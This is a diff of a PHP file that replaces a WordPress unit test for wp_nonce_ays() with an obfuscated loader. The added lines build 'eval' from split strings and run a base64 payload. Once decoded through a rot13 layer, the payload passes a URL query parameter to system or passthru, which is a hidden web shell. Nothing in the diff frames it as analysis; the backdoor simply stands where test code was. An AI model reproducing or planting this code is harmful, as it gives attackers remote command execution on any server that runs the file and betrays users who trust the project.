@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for the wp_nonce_ays() function.
- *
- * @since 5.9.0
- *
- * @group functions
- *
- * @covers ::wp_nonce_ays
- */
-class Tests_Functions_wpNonceAys extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 53882
-	 */
-	public function test_wp_nonce_ays() {
-		$this->expectException( 'WPDieException' );
-		$this->expectExceptionMessage( 'The link you followed has expired.' );
-		$this->expectExceptionCode( 403 );
-
-		wp_nonce_ays( 'random_string' );
-	}
-
-	/**
-	 * @ticket 53882
-	 */
-	public function test_wp_nonce_ays_log_out() {
-		$this->expectException( 'WPDieException' );
-		$this->expectExceptionMessageMatches( '#You are attempting to log out of Test Blog</p><p>Do you really want to <a href="http://' . WP_TESTS_DOMAIN . '/wp-login\.php\?action=logout&amp;_wpnonce=.{10}">log out</a>\?#m' );
-		$this->expectExceptionCode( 403 );
-
-		wp_nonce_ays( 'log-out' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBndXIgamNfYWJhcHJfbmxmKCkgc2hhcGd2YmEuCiAqCiAqIEBmdmFwciA1LjkuMAogKgogKiBAdGViaGMgc2hhcGd2YmFmCiAqCiAqIEBwYmlyZWYgOjpqY19hYmFwcl9ubGYKICovCnB5bmZmIEdyZmdmX1NoYXBndmJhZl9qY0FiYXByTmxmIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIEBndnB4cmcgNTM4ODIKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfYWJhcHJfbmxmKCkgewoJCSRndXZmLT5ya2NycGdSa3ByY2d2YmEoICdKQ1F2clJrcHJjZ3ZiYScgKTsKCQkkZ3V2Zi0+cmtjcnBnUmtwcmNndmJhWnJmZm50ciggJ0d1ciB5dmF4IGxiaCBzYnl5YmpycSB1bmYgcmtjdmVycS4nICk7CgkJJGd1dmYtPnJrY3JwZ1JrcHJjZ3ZiYVBicXIoIDQwMyApOwoKCQlqY19hYmFwcl9ubGYoICdlbmFxYnpfZmdldmF0JyApOwoJfQoKCS8qKgoJICogQGd2cHhyZyA1Mzg4MgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19hYmFwcl9ubGZfeWJ0X2JoZygpIHsKCQkkZ3V2Zi0+cmtjcnBnUmtwcmNndmJhKCAnSkNRdnJSa3ByY2d2YmEnICk7CgkJJGd1dmYtPnJrY3JwZ1JrcHJjZ3ZiYVpyZmZudHJabmdwdXJmKCAnI0xiaCBuZXIgbmdncnpjZ3ZhdCBnYiB5YnQgYmhnIGJzIEdyZmcgT3lidDwvYz48Yz5RYiBsYmggZXJueXlsIGpuYWcgZ2IgPG4gdWVycz1cInVnZ2M6Ly8nIC4gSkNfR1JGR0ZfUUJaTlZBIC4gJy9qYy15YnR2YVwuY3VjXD9ucGd2YmE9eWJ0YmhnJm56YztfamNhYmFwcj0uezEwfVwiPnlidCBiaGc8L24+XD8jeicgKTsKCQkkZ3V2Zi0+cmtjcnBnUmtwcmNndmJhUGJxciggNDAzICk7CgoJCWpjX2FiYXByX25sZiggJ3lidC1iaGcnICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
